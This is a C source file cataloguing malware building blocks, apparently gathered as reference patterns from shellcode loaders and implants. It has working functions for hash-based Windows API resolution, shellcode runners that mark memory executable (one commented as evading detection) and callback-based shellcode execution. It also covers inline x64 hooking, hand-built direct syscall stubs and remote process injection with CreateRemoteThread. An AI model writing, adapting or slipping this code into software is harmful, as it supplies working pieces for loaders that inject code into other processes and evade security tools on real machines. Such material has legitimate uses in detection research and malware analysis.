/*
 * Functions - Callbacks, hooking, dynamic resolution
 * Patterns from shellcode, loaders, implants
 */

#ifdef _WIN32
#include <windows.h>
#else
typedef unsigned char  BYTE;
typedef unsigned short WORD;
typedef unsigned int   DWORD;
typedef unsigned long long QWORD;
typedef void* PVOID;
typedef void* HANDLE;
typedef void* HMODULE;
typedef void* FARPROC;
typedef int BOOL;
#define WINAPI
#endif

// ============================================================================
// FUNCTION POINTER TYPEDEFS - API resolution
// ============================================================================

// Core Windows APIs - what every loader resolves
typedef PVOID   (WINAPI *t_VirtualAlloc)(PVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *t_VirtualProtect)(PVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL    (WINAPI *t_VirtualFree)(PVOID, SIZE_T, DWORD);
typedef HANDLE  (WINAPI *t_CreateThread)(PVOID, SIZE_T, PVOID, PVOID, DWORD, PDWORD);
typedef DWORD   (WINAPI *t_WaitForSingleObject)(HANDLE, DWORD);
typedef HMODULE (WINAPI *t_LoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *t_GetProcAddress)(HMODULE, LPCSTR);
typedef HMODULE (WINAPI *t_GetModuleHandleA)(LPCSTR);

// Process injection APIs
typedef HANDLE  (WINAPI *t_OpenProcess)(DWORD, BOOL, DWORD);
typedef PVOID   (WINAPI *t_VirtualAllocEx)(HANDLE, PVOID, SIZE_T, DWORD, DWORD);
typedef BOOL    (WINAPI *t_WriteProcessMemory)(HANDLE, PVOID, PVOID, SIZE_T, SIZE_T*);
typedef HANDLE  (WINAPI *t_CreateRemoteThread)(HANDLE, PVOID, SIZE_T, PVOID, PVOID, DWORD, PDWORD);

// NTDLL - for direct syscalls / unhooking
typedef LONG    (WINAPI *t_NtAllocateVirtualMemory)(HANDLE, PVOID*, ULONG, PSIZE_T, ULONG, ULONG);
typedef LONG    (WINAPI *t_NtProtectVirtualMemory)(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
typedef LONG    (WINAPI *t_NtWriteVirtualMemory)(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);
typedef LONG    (WINAPI *t_NtCreateThreadEx)(PHANDLE, DWORD, PVOID, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PVOID);

// Short names - what you see in stagers
typedef PVOID  (WINAPI *fnAlloc)(PVOID,SIZE_T,DWORD,DWORD);
typedef HANDLE (WINAPI *fnThread)(PVOID,SIZE_T,PVOID,PVOID,DWORD,PDWORD);
typedef void   (*fnVoid)(void);
typedef DWORD  (*fnShell)(PVOID);

// ============================================================================
// API STRUCT - resolved API table pattern
// ============================================================================

// Compact struct - Cobalt Strike beacon style
typedef struct {
    t_VirtualAlloc       pVA;
    t_VirtualProtect     pVP;
    t_LoadLibraryA       pLLA;
    t_GetProcAddress     pGPA;
    t_CreateThread       pCT;
} API_TABLE;

// With hashes - avoids string storage
typedef struct {
    DWORD hash;
    PVOID addr;
} API_ENTRY;

// ============================================================================
// DYNAMIC RESOLUTION - hash-based
// ============================================================================

#define ROR(x,n) (((x)>>(n))|((x)<<(32-(n))))

DWORD djb2(char* s)
{
    DWORD h = 5381;
    while(*s) h = ((h << 5) + h) + *s++;
    return h;
}

DWORD ror13(char* s)
{
    DWORD h = 0;
    while(*s) { h = ROR(h, 13); h += *s++; }
    return h;
}

// Find export by hash - the core loop
FARPROC get_api(HMODULE hMod, DWORD hash)
{
    BYTE* base = (BYTE*)hMod;

    // PE header navigation
    DWORD pe_off = *(DWORD*)(base + 0x3C);
    DWORD exp_rva = *(DWORD*)(base + pe_off + 0x78);  // x86
    // DWORD exp_rva = *(DWORD*)(base + pe_off + 0x88);  // x64

    if(!exp_rva) return 0;

    BYTE* exp = base + exp_rva;
    DWORD nNames = *(DWORD*)(exp + 0x18);
    DWORD* names = (DWORD*)(base + *(DWORD*)(exp + 0x20));
    WORD*  ords  = (WORD*)(base + *(DWORD*)(exp + 0x24));
    DWORD* funcs = (DWORD*)(base + *(DWORD*)(exp + 0x1C));

    for(DWORD i = 0; i < nNames; i++) {
        char* name = (char*)(base + names[i]);
        if(djb2(name) == hash)
            return (FARPROC)(base + funcs[ords[i]]);
    }
    return 0;
}

// ============================================================================
// SHELLCODE EXECUTION PATTERNS
// ============================================================================

// Direct cast - classic pattern
#define EXEC(p) ((fnVoid)(p))()

// With return value
#define CALL(p,t) ((t(*)())(p))()

// With parameter
#define EXEC1(p,a) ((void(*)(PVOID))(p))(a)

// Full shellcode runner
void run_sc(BYTE* sc, DWORD len)
{
    PVOID p = VirtualAlloc(0, len, 0x3000, 0x40);
    if(!p) return;

    for(DWORD i = 0; i < len; i++)
        ((BYTE*)p)[i] = sc[i];

    ((fnVoid)p)();
}

// Two-stage (RW then RX) - evades some detection
void run_sc_2stage(BYTE* sc, DWORD len)
{
    DWORD old;
    PVOID p = VirtualAlloc(0, len, 0x3000, 0x04);  // RW
    if(!p) return;

    __movsb(p, sc, len);
    VirtualProtect(p, len, 0x20, &old);  // RX
    ((fnVoid)p)();
}

// ============================================================================
// CALLBACK ABUSE - code execution via callbacks
// ============================================================================

/*
 * Pattern: CreateThreadpoolWait callback
 * Executes shellcode without CreateThread
 *
 * PTP_WAIT pWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)shellcode, NULL, NULL);
 * SetThreadpoolWait(pWait, hEvent, NULL);
 * SetEvent(hEvent);
 * WaitForSingleObject(hEvent, INFINITE);
 */

/*
 * Pattern: EnumChildWindows callback
 * EnumChildWindows(NULL, (WNDENUMPROC)shellcode, 0);
 */

/*
 * Pattern: CertEnumSystemStore callback
 * CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, shellcode);
 */

// ============================================================================
// INLINE HOOK STRUCTURE
// ============================================================================

#pragma pack(push,1)
typedef struct {
    BYTE  jmp;       // 0xE9
    DWORD offset;    // relative offset
} JMP_REL32;         // 5 bytes

typedef struct {
    WORD  mov_rax;   // 0xB848 (mov rax, imm64)
    QWORD addr;
    WORD  jmp_rax;   // 0xE0FF (jmp rax)
} JMP_ABS64;         // 12 bytes
#pragma pack(pop)

// Install x64 hook
void hook64(BYTE* target, BYTE* detour, BYTE* saved)
{
    DWORD old;

    // Save original bytes
    for(int i = 0; i < 12; i++)
        saved[i] = target[i];

    VirtualProtect(target, 12, 0x40, &old);

    JMP_ABS64* jmp = (JMP_ABS64*)target;
    jmp->mov_rax = 0xB848;
    jmp->addr = (QWORD)detour;
    jmp->jmp_rax = 0xE0FF;

    VirtualProtect(target, 12, old, &old);
}

// ============================================================================
// TRAMPOLINE PATTERN
// ============================================================================

typedef struct {
    BYTE  saved[16];     // Original bytes
    BYTE  trampoline[32]; // Jump to original + saved bytes
    PVOID original;
    PVOID detour;
} HOOK_ENTRY;

// Call original through trampoline
#define CALL_ORIG(hook, ret, ...) ((ret(*)(__VA_ARGS__))(hook)->trampoline)

// ============================================================================
// SYSCALL STUBS
// ============================================================================

#pragma pack(push,1)
typedef struct {
    BYTE  mov_r10_rcx[3]; // 4C 8B D1
    BYTE  mov_eax[1];     // B8
    DWORD ssn;            // syscall number
    BYTE  syscall[2];     // 0F 05
    BYTE  ret[1];         // C3
} SYSCALL_STUB;           // 11 bytes
#pragma pack(pop)

// Generate syscall stub
void make_syscall(BYTE* buf, DWORD ssn)
{
    SYSCALL_STUB* s = (SYSCALL_STUB*)buf;
    s->mov_r10_rcx[0] = 0x4C;
    s->mov_r10_rcx[1] = 0x8B;
    s->mov_r10_rcx[2] = 0xD1;
    s->mov_eax[0] = 0xB8;
    s->ssn = ssn;
    s->syscall[0] = 0x0F;
    s->syscall[1] = 0x05;
    s->ret[0] = 0xC3;
}

// ============================================================================
// OBFUSCATED CALL PATTERN
// ============================================================================

// Indirect call through pointer array (anti-static-analysis)
typedef struct {
    PVOID funcs[32];
    DWORD count;
} FUNC_TABLE;

PVOID indirect_call(FUNC_TABLE* tbl, DWORD idx, PVOID arg)
{
    if(idx >= tbl->count) return 0;
    return ((PVOID(*)(PVOID))tbl->funcs[idx])(arg);
}

// ============================================================================
// ERROR-FREE PATTERNS
// ============================================================================

// No error checking - common in shellcode
void inject_fast(DWORD pid, BYTE* sc, DWORD len)
{
    HANDLE h = OpenProcess(0x1F0FFF, 0, pid);
    PVOID p = VirtualAllocEx(h, 0, len, 0x3000, 0x40);
    WriteProcessMemory(h, p, sc, len, 0);
    CreateRemoteThread(h, 0, 0, p, 0, 0, 0);
}

// With cleanup - slightly more careful
BOOL inject_clean(DWORD pid, BYTE* sc, DWORD len)
{
    HANDLE h = OpenProcess(0x1F0FFF, 0, pid);
    if(!h) return 0;

    PVOID p = VirtualAllocEx(h, 0, len, 0x3000, 0x40);
    if(!p) { CloseHandle(h); return 0; }

    SIZE_T w;
    if(!WriteProcessMemory(h, p, sc, len, &w) || w != len) {
        VirtualFreeEx(h, p, 0, 0x8000);
        CloseHandle(h);
        return 0;
    }

    HANDLE t = CreateRemoteThread(h, 0, 0, p, 0, 0, 0);
    CloseHandle(h);
    return t != 0;
}

// ============================================================================
// EOF
// ============================================================================
